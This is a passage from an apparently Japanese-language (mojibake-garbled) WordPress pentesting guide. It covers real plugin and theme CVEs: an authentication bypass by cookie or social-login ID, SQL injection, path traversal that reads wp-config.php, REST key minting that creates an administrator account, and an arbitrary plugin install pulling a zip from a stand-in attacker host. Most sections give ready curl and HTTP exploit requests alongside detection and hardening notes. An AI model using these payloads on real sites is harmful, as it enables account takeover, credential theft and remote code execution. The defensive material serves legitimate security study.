if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- å…¬é–‹ã•ã‚ŒãŸ `init` ãƒ•ãƒƒã‚¯ã«ã‚ˆã‚Šãƒãƒ³ãƒ‰ãƒ©ã¯ unauthenticated users ã«åˆ°é”å¯èƒ½ï¼ˆ`is_user_logged_in()` ã‚¬ãƒ¼ãƒ‰ãŒãªã„ï¼‰ã€‚
- è­˜åˆ¥ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§å¤‰æ›´å¯èƒ½ãª cookie (`original_user_id`) ã‹ã‚‰å°å‡ºã•ã‚Œã¦ã„ã‚‹ã€‚
- `wp_set_auth_cookie($uid)` ã‚’ç›´æ¥å‘¼ã³å‡ºã™ã“ã¨ã§ã€ãƒªã‚¯ã‚¨ã‚¹ã‚¿ã‚’ãã®ãƒ¦ãƒ¼ã‚¶ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ â€” capability/nonce checks ãŒè¡Œã‚ã‚Œãªã„ã€‚

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF ã«é–¢ã™ã‚‹ WordPress/plugin CVEs ã®è€ƒæ…®äº‹é …

æ±ç”¨ã® edge/server WAF ã¯ã€åºƒç¯„ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆSQLiã€XSSã€LFIï¼‰å‘ã‘ã«ãƒãƒ¥ãƒ¼ãƒ‹ãƒ³ã‚°ã•ã‚Œã¦ã„ã¾ã™ã€‚å¤šãã®é«˜ã‚¤ãƒ³ãƒ‘ã‚¯ãƒˆãª WordPress/plugin ã®è„†å¼±æ€§ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ãƒ­ã‚¸ãƒƒã‚¯ã‚„èªå¯ï¼ˆauthï¼‰ã®ãƒã‚°ã§ã‚ã‚Šã€ã‚¨ãƒ³ã‚¸ãƒ³ãŒ WordPress ã®ãƒ«ãƒ¼ãƒˆã‚„ plugin ã®ã‚»ãƒãƒ³ãƒ†ã‚£ã‚¯ã‚¹ã‚’ç†è§£ã—ã¦ã„ãªã„é™ã‚Šã€é€šå¸¸ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã«è¦‹ãˆã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Offensive notes

- ã‚¯ãƒªãƒ¼ãƒ³ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ plugin å›ºæœ‰ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’æ¨™çš„ã«ã™ã‚‹: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ã¾ãšã¯èªè¨¼ä¸è¦ã®çµŒè·¯ã‚’è©¦ã™ï¼ˆAJAX `nopriv`, REST ã§ permissive ãª `permission_callback`, public shortcodesï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯é›£èª­åŒ–ãªã—ã§æˆåŠŸã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚
- å…¸å‹çš„ãªé«˜ã‚¤ãƒ³ãƒ‘ã‚¯ãƒˆã®ã‚±ãƒ¼ã‚¹ï¼šæ¨©é™æ˜‡æ ¼ï¼ˆbroken access controlï¼‰ã€ä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰/ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã€LFIã€open redirectã€‚

Defensive notes

- plugin CVEs ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«æ±ç”¨ WAF ã‚·ã‚°ãƒãƒãƒ£ã«ä¾å­˜ã—ãªã„ã“ã¨ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã§è„†å¼±æ€§å›ºæœ‰ã®ä»®æƒ³ãƒ‘ãƒƒãƒã‚’å°å…¥ã™ã‚‹ã‹ã€è¿…é€Ÿã«æ›´æ–°ã™ã‚‹ã€‚
- ã‚³ãƒ¼ãƒ‰å†…ã§ã¯ã€ãƒã‚¬ãƒ†ã‚£ãƒ–ãª regex ãƒ•ã‚£ãƒ«ã‚¿ã‚ˆã‚Šã‚‚ã€ãƒã‚¸ãƒ†ã‚£ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ï¼ˆcapabilitiesã€noncesã€å³æ ¼ãªå…¥åŠ›æ¤œè¨¼ï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

## WordPress Protection

### Regular Updates

WordPressã€pluginsã€themes ãŒæœ€æ–°ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã¾ãŸ wp-config.php ã§è‡ªå‹•æ›´æ–°ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ã¾ãŸã€**ä¿¡é ¼ã§ãã‚‹ WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ã¿ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„**ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ãã®ä»–ã®æ¨å¥¨äº‹é …**

- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® **admin** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹
- **å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã¨ **2FA** ã‚’ä½¿ç”¨ã™ã‚‹
- å®šæœŸçš„ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒ¬ãƒ“ãƒ¥ãƒ¼**ãŠã‚ˆã³**æ¨©é™**ã‚’ç¢ºèªã™ã‚‹
- **ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œå›æ•°ã‚’åˆ¶é™ã™ã‚‹**ã“ã¨ã§ Brute Force æ”»æ’ƒã‚’é˜²ã
- **`wp-admin.php`** ãƒ•ã‚¡ã‚¤ãƒ«åã‚’å¤‰æ›´ã—ã€å†…éƒ¨ã¾ãŸã¯ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã€‚

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal æ¡ç”¨ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ **savecategory** ã‚¿ã‚¹ã‚¯ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€çµæœçš„ã« `modules/category/model.php::validateFormData()` å†…ã§ä»¥ä¸‹ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ãŸï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã«ã‚ˆã£ã¦å°å…¥ã•ã‚ŒãŸå•é¡Œ:

1. **ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›** â€“ `parentid` ã¯ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ãã®ã¾ã¾å–å¾—ã•ã‚Œã¦ã„ã¾ã™ã€‚
2. **WHEREå¥å†…ã§ã®æ–‡å­—åˆ—é€£çµ** â€“ `is_numeric()` / `esc_sql()` / ãƒ—ãƒªãƒšã‚¢ãƒ‰ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
3. **èªè¨¼ä¸è¦ã§åˆ°é”å¯èƒ½** â€“ ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ `admin-post.php` ã‚’é€šã˜ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ãŒã€å”¯ä¸€ã®ãƒã‚§ãƒƒã‚¯ã¯ **CSRF nonce**ï¼ˆ`wp_verify_nonce()`ï¼‰ã ã‘ã§ã€ä»»æ„ã®è¨ªå•è€…ãŒã‚·ãƒ§ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ `[wpjobportal_my_resumes]` ã‚’åŸ‹ã‚è¾¼ã‚“ã å…¬é–‹ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

#### æ‚ªç”¨

1. æ–°ã—ã„ nonce ã‚’å–å¾—:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã® SQL ã‚’æ³¨å…¥:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯æ³¨å…¥ã—ãŸã‚¯ã‚¨ãƒªã®çµæœã‚’é–‹ç¤ºã™ã‚‹ã‹ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã€SQLi ã®å­˜åœ¨ã‚’è¨¼æ˜ã—ã¾ã™ã€‚


### èªè¨¼ä¸è¦ã®ä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ / ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ« (WP Job Portal <= 2.3.2)

åˆ¥ã®ã‚¿ã‚¹ã‚¯ã§ã‚ã‚‹ **downloadcustomfile** ã«ã‚ˆã‚Šã€è¨ªå•è€…ã¯ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’ä½¿ã£ã¦ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã® **ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã—ãŸã€‚è„†å¼±ãªã‚·ãƒ³ã‚¯ã¯ `modules/customfield/model.php::downloadCustomUploadedFile()` ã«ã‚ã‚Šã¾ã™ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ã¯æ”»æ’ƒè€…ã«ã‚ˆã‚Šåˆ¶å¾¡ã•ã‚Œã€**ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã¦ã„ãªã„**çŠ¶æ…‹ã§é€£çµã•ã‚Œã¾ã™ã€‚å†åº¦ã€å”¯ä¸€ã®ã‚²ãƒ¼ãƒˆã¯ **CSRF nonce** ã§ã€resume ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ã‚µãƒ¼ãƒãƒ¼ã¯ `wp-config.php` ã®å†…å®¹ã‚’è¿”ã—ã€leaking DB credentials and auth keysã€‚

## æœªèªè¨¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ä¹—ã£å–ã‚Š via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

å¤šãã®ãƒ†ãƒ¼ãƒ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ admin-ajax.php çµŒç”±ã§å…¬é–‹ã•ã‚Œã‚‹ "social login" ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’åŒæ¢±ã—ã¦ã„ã¾ã™ã€‚æœªèªè¨¼ã® AJAX ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ (wp_ajax_nopriv_...) ãŒã€provider data ãŒãªã„å ´åˆã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæä¾›ã®è­˜åˆ¥å­ã‚’ä¿¡ç”¨ã—ã¦ã‹ã‚‰ wp_set_auth_cookie() ã‚’å‘¼ã³å‡ºã™ã¨ã€ã“ã‚Œã¯å®Œå…¨ãªèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ã«ãªã‚Šã¾ã™ã€‚

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- admin-ajax.php çµŒç”±ã§èªè¨¼ãªã—ã§åˆ°é”å¯èƒ½ï¼ˆwp_ajax_nopriv_â€¦ actionï¼‰ã€‚
- nonce/capability ãƒã‚§ãƒƒã‚¯ãŒçŠ¶æ…‹å¤‰æ›´å‰ã«è¡Œã‚ã‚Œã¦ã„ãªã„ã€‚
- OAuth/OpenID ãƒ—ãƒ­ãƒã‚¤ãƒ€æ¤œè¨¼ãŒæ¬ å¦‚ã—ã¦ãŠã‚Šã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ãŒæ”»æ’ƒè€…ã®å…¥åŠ›ã‚’å—ã‘å…¥ã‚Œã¦ã—ã¾ã†ã€‚
- get_user_by('email', $_POST['id']) ã®å¾Œã« wp_set_auth_cookie($uid) ãŒå‘¼ã°ã‚Œã€è¦æ±‚è€…ã‚’ä»»æ„ã®æ—¢å­˜ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦èªè¨¼ã—ã¦ã—ã¾ã†ã€‚

Exploitation (unauthenticated)

- å‰ææ¡ä»¶ï¼šæ”»æ’ƒè€…ãŒ /wp-admin/admin-ajax.php ã«åˆ°é”ã§ãã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¡ãƒ¼ãƒ«ã‚’çŸ¥ã£ã¦ã„ã‚‹ã‹æ¨æ¸¬ã§ãã‚‹ã“ã¨ã€‚
- provider ã‚’ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„å€¤ã«è¨­å®šã™ã‚‹ï¼ˆã¾ãŸã¯çœç•¥ã™ã‚‹ï¼‰ã“ã¨ã§ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ã«å…¥ã‚Šã€id=<victim_email> ã‚’æ¸¡ã™ã€‚
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- ãƒ†ãƒ¼ãƒã‚„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã§ add_action('wp_ajax_nopriv_...', '...') ã®ç™»éŒ²ã‚’ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ã®ã‚³ãƒ¼ãƒ‰ï¼ˆä¾‹: framework/add-ons/social-login/class-social-login.phpï¼‰ã§ç¢ºèªã™ã‚‹ã€‚
- AJAX ãƒãƒ³ãƒ‰ãƒ©å†…ã§ wp_set_auth_cookie(), get_user_by('email', ...) ã‚’ grep ã™ã‚‹ã€‚

Detection checklist

- Web ãƒ­ã‚°ã«ã€social-login ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¨ id=<email> ã‚’å«ã‚€ /wp-admin/admin-ajax.php ã¸ã®æœªèªè¨¼ã® POST ãŒè¨˜éŒ²ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã€‚
- åŒä¸€ã® IP/User-Agent ã‹ã‚‰ã®èªè¨¼æ¸ˆã¿ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã«å…ˆç«‹ã¡ã€success JSON ã‚’å«ã‚€ 200 ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒã‚ã‚‹ã“ã¨ã€‚

Hardening

- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå…¥åŠ›ã‹ã‚‰è­˜åˆ¥æƒ…å ±ã‚’æ´¾ç”Ÿã•ã›ãªã„ã€‚æ¤œè¨¼æ¸ˆã¿ãƒ—ãƒ­ãƒã‚¤ãƒ€ã® token/ID ã«ç”±æ¥ã™ã‚‹ email/ID ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹ã€‚
- ãƒ­ã‚°ã‚¤ãƒ³è£œåŠ©ã§ã‚‚ CSRF nonces ã¨ capability checks ã‚’è¦æ±‚ã™ã‚‹ã€‚wp_ajax_nopriv_ ã¯å³å¯†ã«å¿…è¦ãªå ´åˆä»¥å¤–ç™»éŒ²ã—ãªã„ã€‚
- OAuth/OIDC ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚µãƒ¼ãƒå´ã§æ¤œè¨¼ã—ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãŒæ¬ è½ã¾ãŸã¯ç„¡åŠ¹ãªå ´åˆã¯æ‹’å¦ã™ã‚‹ï¼ˆPOST id ã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã—ãªã„ï¼‰ã€‚
- ä¿®æ­£ã•ã‚Œã‚‹ã¾ã§ã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ã‚’ä¸€æ™‚çš„ã«ç„¡åŠ¹åŒ–ã™ã‚‹ã‹ã€ã‚¨ãƒƒã‚¸ã§ä»®æƒ³ãƒ‘ãƒƒãƒï¼ˆè„†å¼±ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ–ãƒ­ãƒƒã‚¯ï¼‰ã™ã‚‹ã“ã¨ã‚’æ¤œè¨ã™ã‚‹ã€‚

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

Some plugins expose REST endpoints that mint reusable â€œconnection keysâ€ or tokens without verifying the callerâ€™s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why itâ€™s exploitable
- Sensitive REST route protected only by low-entropy identity proof (username) or missing permission_callback
- No capability enforcement; minted key is accepted as a universal bypass

Detection checklist
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚³ãƒ¼ãƒ‰ã‚’ grep ã—ã¦ register_rest_route(..., [ 'permission_callback' => '__return_true' ]) ã‚’æ¢ã™
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ï¼ˆusername/emailï¼‰ã«åŸºã¥ã„ã¦ãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’ç™ºè¡Œã—ã€èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ capability ã«ç´ä»˜ã‘ã¦ã„ãªã„ãƒ«ãƒ¼ãƒˆ
- ã‚µãƒ¼ãƒãƒ¼å´ã® capability ãƒã‚§ãƒƒã‚¯ãªã—ã«ç™ºè¡Œæ¸ˆã¿ãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’å—ã‘å…¥ã‚Œã‚‹å¾Œç¶šãƒ«ãƒ¼ãƒˆã‚’æ¢ã™

Hardening
- ç‰¹æ¨©ã‚’æŒã¤ REST ãƒ«ãƒ¼ãƒˆã§ã¯ã€å¿…è¦ãª capability ã«å¯¾ã—ã¦ current_user_can() ã‚’å¼·åˆ¶ã™ã‚‹ permission_callback ã‚’è¦æ±‚ã™ã‚‹
- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ã‹ã‚‰é•·å¯¿å‘½ã‚­ãƒ¼ã‚’ç™ºè¡Œã—ãªã„ã€‚å¿…è¦ãªå ´åˆã¯ã€èªè¨¼å¾Œã«çŸ­å¯¿å‘½ã‹ã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ç´ã¥ã„ãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã—ã€ä½¿ç”¨æ™‚ã« capability ã‚’å†ç¢ºèªã™ã‚‹
- å‘¼ã³å‡ºã—å…ƒã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ¤œè¨¼ã™ã‚‹ï¼ˆwp_set_current_user ã¯å˜ç‹¬ã§ã¯ä¸ååˆ†ï¼‰ãŠã‚ˆã³ !is_user_logged_in() || !current_user_can(<cap>) ã®å ´åˆã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‹’å¦ã™ã‚‹

---

## Nonce gate misuse â†’ èªè¨¼ã•ã‚Œã¦ã„ãªã„ä»»æ„ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ« (FunnelKit Automations â‰¤ 3.5.3)

Nonces ã¯ CSRF ã‚’é˜²ãã‚‚ã®ã§ã‚ã‚Šã€èªå¯ã‚’æ„å‘³ã™ã‚‹ã‚‚ã®ã§ã¯ãªã„ã€‚ã‚³ãƒ¼ãƒ‰ãŒ nonce ã®é€šéã‚’å®‰å…¨ã®åˆå›³ã¨ã¿ãªã—ã¦ç‰¹æ¨©æ“ä½œï¼ˆä¾‹: install/activate pluginsï¼‰ã® capability ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã¨ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„æ”»æ’ƒè€…ãŒå¼±ã„ nonce è¦ä»¶ã‚’æº€ãŸã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢å…¥ã‚Šã‚„è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã“ã¨ã§ RCE ã«åˆ°é”ã—å¾—ã‚‹ã€‚

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- wp_verify_nonce()/check_admin_referer() ã®ã¿ã§æ¨©é™ãƒã‚§ãƒƒã‚¯ãŒãªã„ã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³/ãƒ†ãƒ¼ãƒã‚’å¤‰æ›´ã™ã‚‹ REST/AJAX ãƒãƒ³ãƒ‰ãƒ©
- nonce æ¤œè¨¼å¾Œã« $skip_caps = true ã‚’è¨­å®šã™ã‚‹ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ãƒ‘ã‚¹

Hardening
- nonces ã¯å¸¸ã« CSRF ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã—ã¦ã®ã¿æ‰±ã†ï¼›nonce ã®çŠ¶æ…‹ã«é–¢ä¿‚ãªãæ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’å¼·åˆ¶ã™ã‚‹
- installer code ã«åˆ°é”ã™ã‚‹å‰ã« current_user_can('install_plugins') ã¨ current_user_can('activate_plugins') ã‚’è¦æ±‚ã™ã‚‹
- æœªèªè¨¼ã‚¢ã‚¯ã‚»ã‚¹ã‚’æ‹’å¦ã™ã‚‹ï¼›ç‰¹æ¨©ãƒ•ãƒ­ãƒ¼ã«å¯¾ã—ã¦ nopriv AJAX actions ã‚’å…¬é–‹ã—ãªã„

---

## depicter-* actions ã® s (search) ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿çµŒç”±ã®èªè¨¼ä¸è¦ã® SQLi (Depicter Slider â‰¤ 3.6.1)

è¤‡æ•°ã® depicter-* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒ s (search) ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å—ã‘å–ã‚Šã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ãªã—ã§ SQL ã‚¯ã‚¨ãƒªã«é€£çµã—ã¦ã„ãŸã€‚

- Parameter: s (search)
- Flaw: WHERE/LIKE å¥ã§ã®ç›´æ¥æ–‡å­—åˆ—é€£çµï¼›prepared statements/ã‚µãƒ‹ã‚¿ã‚¤ã‚ºãªã—
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- $wpdb->get_results()/query() ã«æ¸¡ã•ã‚Œã‚‹ã‚«ã‚¹ã‚¿ãƒ ã‚¯ã‚¨ãƒªã§ s ã‚’é€£çµã—ã¦ã„ã‚‹ç®‡æ‰€ã‚’ç¢ºèª

Hardening
- å¸¸ã« $wpdb->prepare() ã¾ãŸã¯ wpdb ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ã‚’ä½¿ç”¨ã—ã€ã‚µãƒ¼ãƒãƒ¼å´ã§äºˆæœŸã—ãªã„ãƒ¡ã‚¿æ–‡å­—ã‚’æ‹’å¦ã™ã‚‹
